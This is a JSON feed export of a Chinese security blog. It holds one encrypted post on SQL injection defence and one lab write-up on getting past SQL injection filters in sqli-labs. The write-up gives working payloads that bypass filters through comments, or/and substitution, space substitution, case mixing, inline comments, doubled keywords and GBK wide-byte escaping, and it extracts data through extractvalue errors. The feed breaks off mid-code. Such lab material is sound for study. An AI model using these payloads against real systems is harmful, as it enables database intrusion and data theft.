{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/",
            "url": "https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/",
            "title": "SQL注入防御",
            "date_published": "2022-10-02T16:01:22.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"c641acdafe8c664ad9c22d562811bf3eb712359f6c21c7f85b498d5d308214e1\">881d2a9d793d5558f4c5d7fc62042411cf78789d816c07caf10e349ab53763fc4406ac6aa8d29d42cadd709c9846848edc3ac8104b0a2aee2c589cb45a26d3d8b178130e12ad9309ce4576c62702a0acc5c5e0b2c404d7e4b61c4c97f4993f633823e83e93d4ffc19aec520e686b2b6b50ac5c2af583e8e5cea2dca26beef6e9d43e30cd5dba5681515560b65f29d028540c9afca386cb49bf2836dabbf17da15fe87d476fd265f53d877e4d01fd752763b21295d9881af287630fb6106cb80aa6bf01669d6e858c8f7ea7c57cfd480cae54afcc3200a38624701c979b4328fe806ec968b963706cbe3a08e55034f135c65bda6ee4575dbcd0c554d54b4c3abc340028339080bbd58d716b6c55689531128b2ef7e8761cc8d5898a71d974a5dbc2b13b717805d70287c03d2b0b68b1238e822799f64e1333e136ef072a8ef074268b088e21678143520c90a2c931ee162b74f5217d08504be80104a541b6bd6b670428c2e266186dff210f6a11a5475a0567258f88c3edef9ce229885949776934d62bf3f26eae0f797b9ba41ada122c70cc8527f7acb6706817d2ec6ffa19ddb65aec9c747b7f98b8d88a85cb534971c04213b718114e7e39192778c30faf28e7ee9038d4c62881b83a6e22a72eb7a28f6c1181752ef5b3506466994f63ddb9383bfdbaffb65ff89664e8bd1a96311f414f708bcaed8759bd9021f79358ffc85eda6188cade79fc557c1980336aa70aaedccf18517edd9d9219a60ecfa718153dc0d5caaa6f2fc796056a5ed2477ae8fc7c5f54e7e70b33c1ddaf8499073ca6336440d009e42ff4e69db6fa353c640fc1735e6bd2071417e18721556ba441d7065363ec54d2fa0636e120c54d225eada7cfe8ec2267230ea312614e307433ed71bdb90533dd4ce4aa2032d8f924423f93ab40a221801b3e60c557897c5a2a97843ba0889c913bddaee1a794538bbb93dec7e83df8378efb02551f41b965841f59d38f46481e9d60d37eca9ed33dfcbecd282dde7c89a4217b81df6bc162802b251b031516f0b73e137750e8f32710649731d00cbe84a3ae4f9340d93f2cd993764d26e23a1ef9c471919cd697b7671da0a2e7f5f68af0a4849384a9ee54f9fa426a63265e623bf3f18ceeef37e3521e3ec2e73394cac5fbade500888bb94d95a8a10cffe2770af1ddf3c9df804d0dc1411808d280b2f68700c3cd9495b5824b630baa112075d5ff3a3e5a4684b3b4519fd2605f41aa5a6448796683aa1fa9ed83521618ca375b8b0a7742b482ca59cd9ae520e5c80e615ca1239d574fd78ee6b05dad11545fa2afdae53a630d8dc84c1ca07ad6ec2d48f1e7ed649fd77ee9caca192997059406cc314201f435c1eb3edced4f274e97a3a8dae2a379ba0f2245892a0d307a8d0231aa313c7b46aab5167a97bd7b8dff8d7a39a032468b923a473553d4ec2706cebef7b6980e5d262345172eb783ff2a561803d0e6fdddbb5b150fa14f57f3f1db7c1a17020a53df9edf64626952f3a9745e674eebb54e958077e76228b9d80954514486068de20a84f3409e6745ef7e38d9d4777e489958c07b34d9628b0ceb0e1da5792743895c749fa9092f788305f4693c38fe3a428ee596bfa0a0b2ed5361d276f2dd3b011a386c58b65491e7a93cdf86b0435b7ccd8faed5cd96e459092de94a8a173ee21b813915327597209dddc67ecd183b8795d4e0d89bde81989f37282d51701c9288c5b2693bf42ea6c7712f33ab6eeeccb7c9566366abdcfdf98d8b7b220befcc90acc2998ff48087f1c6353e7a0b97641d572afe6c137064f322303ed9aa6360e96e85f3ab7d37b9323ebd05dd3851d449e2acd01b98f32930849edeee57b930d51d958a939669fd3f633ff9b6717854f6a8f01c5dcc64682c8ae567d1c6617ccd957db555e2570a2d079a0fc8ec6206cc52231fe72f14d77863ff8a2552271d16cf52bc51c868214f71dc014fe4484d959cc170b0b3b99c60847135e54d1fccea31f492c301bd6e02c2697a4e7bf905815a0471fdc2972844092df19bbb8ba4a6a9824d5532a5bad5dd9676cea0ef98dac0a6b4292052e53a3fd6ec22812cb4fe730ac0ed0d00b7570eaf765c5cb86f6221455081150a6cff7bbb63b53cba09cfdd4b9932255e24cb7dc94a5c8e4cd92cb063dfe464513c842c328dd7afe5591501781d5e6139d6d68ac4ea7d29a138f0f7f238998082912ced5f043376695afc2cf2281b13344b363c654fa34da77a64d63e62f9b6738e34e31fd308b2098caba1022b448e57025ce02f73ec4d591be1a3f17f1207ef91fa6f77a1418902d8611c5ad0270738e612dfa397123d089af5c400129a6fb37e50ba754164b4b2ad55f269762d6bac82bf698bc9bd883709bfcc106f95c07fd3eb4bce2e96684c647ed2a4868860e10bf4112911a31d237586eb2207cd8fc3e33458bd7e2ee65f63f7d262f67e74ce66055ba3be73923518202a1fc913ebd9beb2035edecafb2d6e1a2a02b0b23e51ce0af962043c9ecf3cd08e97907ed2a5b45e76361bd112d12e51610b399fe363f30eec8481ba53321741419c6c3da5035910193a68b60fedcc257874099aa56379c6b8509b1718348db8f2e96424031c6598b51078d220d6f957445ceca6e8d847b23c8a5b345c06ffaf43e931d5fd5504ae54a14a031344123f676c4c0e625819688e632b8e70e6f625fbcfead20b1fe7152e224d01b1282a5a6198138de5be5a3b0c5d255e949c97e8ed7fb02c937724129b097ac9f79b2d1d9082c0964f2fc8be9daa035c2a7c607a0ec150c4d51b51dde416c312141f6e9d6d8116dd712dfae8ea4d90aa9addeb469f4f75fe4e6deb1c952972be2510b9993dc60556e1e1e57f267483a12326db9158583ca65094f3fd93d8bd9097ed4a4927ce5c135664d57518ec289e5b95936fe52f0e72d1e21e4b47e03b8ff79bc9e2cfe7b60661e1334da4ae42be99c1dfbfb48bf15ef5cc64503f54ee7e986421fbea9b11c3f09e229b68a761c8b81be49162e738e4901cf30b12e2682ff2f1250e7ea4f53988b8379fd6ba8ced73a37c32236e80b95bc2516028bb09743438cf5c70607198f052806921324d19054807dcd2b61e1063a01a2bc5eb7ad004b13a716f65ace7b4ddc3ed25841597d12e7bad9b233dad078aea6538a8dbd89a50047a3157a6c8330249e579a39fe61551c3eaaac09539e6199d9fe06542736d7014edddb81318265cacb53ba3ec959ceeb94cad9f4e6a6497efabbb8f87e045f7ac04d83f058b4ef9106ca5077d5e4a2c20a62f4b7466e51e811ba6fccfbb27a76a6ff2d2c5b3ec917a833bd18d867447ed155bdffba150d8366c029fd1df9077308c83c7af6aacbd4ef338cf29033972c3e6146d0086728a5d84f5fbd0cf4b53f01b0e4d9b393fefbc20145be6b8db09ad3e95281257649eeb8ecb863bcd4d4b9a639104522b26f6c9847ca826e9aa1685e37e5b0bc9c2d222f9ff572aba51eb3d1c9eb66c8c592aa3ad1dd911bfdb12c8defe86d678dabcdd559fcea118fdab703e1e7f47e4d5f45e8159104f17cb16c74fe3eb86976cc29435a59c31f859b3bd41359ea3e80a51c9e8d127c840af65c061ccdf69270bbe3ee702d1c97db573c7774b6477dae86ea95bf58987700dde4c90db155f0b97d21504839ce30d9ee306949ca4c28c335c83e2609695c3b5c05ec49077deeda534a67fda734eb799d8a66ed0fa</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-wave\">\n      <input class=\"hbe hbe-input-field hbe-input-field-wave\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-wave\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-wave\">Hey, password is required here.</span>\n      </label>\n      <svg class=\"hbe hbe-graphic hbe-graphic-wave\" width=\"300%\" height=\"100%\" viewBox=\"0 0 1200 60\" preserveAspectRatio=\"none\">\n        <path d=\"M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0\"></path>\n      </svg>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/",
            "title": "绕过注入防御技巧",
            "date_published": "2022-10-02T15:16:31.000Z",
            "content_html": "<h1 id=\"绕过各种注入防御\"><a class=\"markdownIt-Anchor\" href=\"#绕过各种注入防御\">#</a> 绕过各种注入防御</h1>\n<p>下面介绍几个绕过注入防御的知识：</p>\n<h2 id=\"绕过注释符过滤\"><a class=\"markdownIt-Anchor\" href=\"#绕过注释符过滤\">#</a> 绕过注释符过滤</h2>\n<p>常见注释符有： <code>#</code> 、 <code>%23</code> 、 <code>--+</code></p>\n<p>Less-23 为例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002134327907.png\" alt=\"image-20221002134327907\"></p>\n<p>做以下尝试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; %23</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">3.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; %23 a</span><br><span class=\"line\">报错，syntax to use near &#x27;a&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">4.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; %23 a</span><br><span class=\"line\">syntax to use near &#x27;&quot; a&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据第三、第四次的结果来看</p>\n<p><code>1' %23 a</code>   —&gt;  <code>a' LIMIT 0,1</code></p>\n<p><code>1'&quot; %23 a</code>  —&gt;  <code>&quot; a' LIMIT 0,1</code></p>\n<p>共同的特性是<strong>输入的字母 a 保留，%23 被过滤</strong></p>\n<p>那 <code>#</code> 和 <code>--+</code>  呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; # a</span><br><span class=\"line\">报错，syntax to use near &#x27;&quot; &#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; --+ a</span><br><span class=\"line\">报错，syntax to use near &#x27;&quot; a&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>因此，有理由怀疑 ——<strong> 注释符被后台彻底过滤</strong>。</p>\n<p>我们来根据报错语句猜想一下后台语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from xxxx where id = &#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式一\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式一\">#</a> 绕过方式一</h3>\n<p>我们可以尝试加一个 <code>单引号</code>  + <code>等号</code>  + <code>单引号</code> ：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from xxxx where id = &#x27;1 &#x27;=&#x27; &#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n<p><code>'='</code>  即为我们的注入语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;=&#x27;</span><br><span class=\"line\">Your Login name:Angelina</span><br><span class=\"line\">Your Password:I-kill-you</span><br></pre></td></tr></table></figure>\n<p>成功查询，不报错。但是使用 <code>'='</code>  的话，我们没地方可插入一些想要的查询语句</p>\n<p>我们需要换一个思路</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or 1 or &#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>那么可以使用 <code>布尔注入</code>  +  <code>报错注入</code> 结合，替换两个 <code>or</code>  中间的那个 <code>1</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or (select extractvalue(1,concat(0x7e,version(),0x7e))) or &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002140115121.png\" alt=\"image-20221002140115121\"></p>\n<p>接下来就可以愉快地爆出数据库名、表、列、值等信息。</p>\n<p>以爆出列名为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))) or &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002140341257.png\" alt=\"image-20221002140341257\"></p>\n<h3 id=\"绕过方式二\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式二\">#</a> 绕过方式二</h3>\n<p>其实，我们也可以通过闭合前后的单引号，中间使用 union 来做操作</p>\n<p><code>注意</code> ：后面单引号引领着一个列，所以 union select 的包含的列需要把后面的单引号内容考虑进来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#两个列</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; union select 1, &#x27;</span><br><span class=\"line\">报错，The used SELECT statements have a different number of columns</span><br><span class=\"line\"></span><br><span class=\"line\">#三个列</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; union select 1,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<h2 id=\"绕过andor强过滤\"><a class=\"markdownIt-Anchor\" href=\"#绕过andor强过滤\">#</a> 绕过 and/or 强过滤</h2>\n<p>将 and/or 及其大小写，混合大小写（Or、oR 等）均替换成空</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; order by 2 %23</span><br><span class=\"line\">报错，syntax to use near &#x27;der by 2 #&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; aa order by 2 %23</span><br><span class=\"line\">报错，syntax to use near &#x27;aa der by 2 #&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以发现 or 被强制过滤，即任何出现 or 的地方被强制替换成空</p>\n<h3 id=\"绕过方式\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式\">#</a> 绕过方式</h3>\n<p>使用 <code>||</code> 、 <code>oorr</code>  来替代 or，再使用布尔替换 + 报错注入构造查询：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=-1&#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) %23</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; oorr (select extractvalue(1,concat(0x7e,version(),0x7e))) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002142717645.png\" alt=\"image-20221002142717645\"></p>\n<h2 id=\"绕过空格字符\"><a class=\"markdownIt-Anchor\" href=\"#绕过空格字符\">#</a> 绕过空格字符</h2>\n<p>Less-26 为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; %23</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; or 1 or &#x27;</span><br><span class=\"line\">错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || 1 || &#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>由此，可以构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) || &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002143828165.png\" alt=\"image-20221002143828165\"></p>\n<p>空格被过滤</p>\n<h3 id=\"绕过方式-2\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式-2\">#</a> 绕过方式</h3>\n<p>常见的空格替换方式有：</p>\n<ul>\n<li><code>%09</code>  TAB 键 (水平)</li>\n<li><code>%0a</code>  新建一行</li>\n<li><code>%0c</code>  新的一页</li>\n<li><code>%0d</code>  return 功能</li>\n<li><code>%0b</code>  TAB 键 (垂直)</li>\n<li><code>%a0</code>  空格</li>\n<li><code>/**/ </code> 也是一种替代空格方式</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || (select%a0extractvalue(1,concat(0x7e,version(),0x7e))) || &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002144131652.png\" alt=\"image-20221002144131652\"></p>\n<h2 id=\"绕过一些对于select-union的限制\"><a class=\"markdownIt-Anchor\" href=\"#绕过一些对于select-union的限制\">#</a> 绕过一些对于 select、union 的限制</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;</span><br><span class=\"line\">syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; %23</span><br><span class=\"line\">syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; or 1 or &#x27; %23</span><br><span class=\"line\">syntax to use near &#x27;or1or&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>基于以上尝试，可以看出空格被过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0or%a01%a0or%a0&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>那么可以有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0order%a0by%a02&#x27; %23</span><br><span class=\"line\">报错，尝试用union select</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; union select 1,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0union%a0select%a01,&#x27;</span><br></pre></td></tr></table></figure>\n<p>可以看出，union 和 select 被过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0&quot;union%a0select%a01,&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002150152965.png\" alt=\"image-20221002150152965\"></p>\n<h3 id=\"绕过方式一-2\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式一-2\">#</a> 绕过方式一</h3>\n<p>大小写随机替换（可能需要多尝试几次）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0Union%a0seLEct%a01,2,&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;seLEct�1,2,&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0UNion%a0seLEct%a01,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; UNion sEleCT 1,2,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0UNion%a0sEleCT%a01,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002150723525.png\" alt=\"image-20221002150723525\"></p>\n<h3 id=\"绕过方式二-2\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式二-2\">#</a> 绕过方式二</h3>\n<p>使用内联注释绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; /*!union*/ /*!select*/ 1,2,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0/*!union*/%a0/*!select*/%a01,2,&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式三\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式三\">#</a> 绕过方式三</h3>\n<p>使用双写、三写绕过（和绕过方式一一样，这个也需要多次尝试）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#在union任意位置中插入union</span><br><span class=\"line\">union---&gt;un union ion (双写)</span><br><span class=\"line\"></span><br><span class=\"line\">#在select任意位置中插入select</span><br><span class=\"line\">select ---&gt;se select lect(双写) ----&gt; sese select lectlect(三写)</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0ununionion%a0seseselectlectlect%a01,2,&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002170323197.png\" alt=\"image-20221002170323197\"></p>\n<h2 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p>MySQL 中，当数据库编码是 GBK 的时候，编码可以表示中文，两个字符代表一个汉字。</p>\n<p>编码范围是：8140-FEFE</p>\n<p>其中，GB2312 的编码范围是：B0A1-F7FE</p>\n<p>Less-32 为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1&#x27;</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1\\&#x27;</span><br><span class=\"line\">The Query String you input in Hex becomes : 315c27</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1&#x27;&quot;</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1\\&#x27;\\&quot;</span><br><span class=\"line\">The Query String you input in Hex becomes : 315c275c22</span><br></pre></td></tr></table></figure>\n<p>可以发现，我们的单引号在服务器后台被 <code>\\号</code> 转义了。</p>\n<h3 id=\"绕过方式-3\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式-3\">#</a> 绕过方式</h3>\n<p>观察反斜杠的 hex 值发现是 5c，接下来我们根据 GBK 编码来做单引号逃逸。</p>\n<p><code>815C</code>  在 GBK 编码范围 <code>8140-FEFE</code>  中，因此我们在单引号前加一个 %81，令其与后台的反斜杠组成双字节被解析，从而释放出我们的单引号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%81&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1�\\&#x27; #</span><br></pre></td></tr></table></figure>\n<p>同理，在 GBK2312 里行得通吗？答案是肯定的</p>\n<p><code>B15C</code>  在 GB2312 的编码范围 <code>B0A1-F7FE</code>  中，那么：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1�\\&#x27; #</span><br></pre></td></tr></table></figure>\n<p>因此就可以：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; order by 3%23</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; order by 4%23-----报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=-1%B1&#x27; union select 1,2,version()%23</span><br><span class=\"line\">Your Login name:2</span><br><span class=\"line\">Your Password:5.1.73-community</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤函数绕过\"><a class=\"markdownIt-Anchor\" href=\"#过滤函数绕过\">#</a> 过滤函数绕过</h2>\n<p>以 SQLC-sql9 为例</p>\n<p>输入 admin、admin 结果报错</p>\n<p><img src=\"image-20221002173314221.png\" alt=\"image-20221002173314221\"></p>\n<p>直接上 BurpSuit，抓包送入 Repeater</p>\n<p><img src=\"image-20221002173445571.png\" alt=\"image-20221002173445571\"></p>\n<p>输入单引号，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;&amp;passwd=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002173656791.png\" alt=\"image-20221002173656791\"></p>\n<p>我们直接送入 Intruder 进行特殊字符爆破，看看都过滤了哪些字符</p>\n<p><img src=\"image-20221002174151275.png\" alt=\"image-20221002174151275\"></p>\n<p>将特殊字符 load 进来</p>\n<p><img src=\"image-20221002174237643.png\" alt=\"image-20221002174237643\"></p>\n<p>可以看到过滤了空格，逗号等字符【由于环境不一样可能每个人的结果不同，因此不贴图，按照没有空格和逗号展开绕过】</p>\n<p>既然没有空格，我们可以使用 <code>小括号</code> 或者 <code>%a0</code>  代替，这里选择 <code>小括号</code> 。</p>\n<p>既然没有逗号，那么很多函数我们就用不了了，比如 <code>substr</code> 、 <code>extractvalue</code>  等等。</p>\n<p>但是，substr 还有个特性就是 substr (str from n) 表示<strong>从第 n 位到结尾截取字符</strong></p>\n<p>OK，空格和逗号的问题都解决了。<strong>剩下就是搞定注入点</strong>！！！！</p>\n<p><img src=\"image-20221002230320006.png\" alt=\"image-20221002230320006\"></p>\n<p>我们看到 <code>返回包里有个Hint</code> ，由于格式是 <code>大小写</code>  + <code>数字</code>  + <code>==</code> ，我们解码 <code>Base64</code></p>\n<p><img src=\"image-20221002225334319.png\" alt=\"image-20221002225334319\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$query=&quot;SELECT * FROM admin WHERE uname=&#x27;&quot;.$uname.&quot;&#x27;&quot;;if 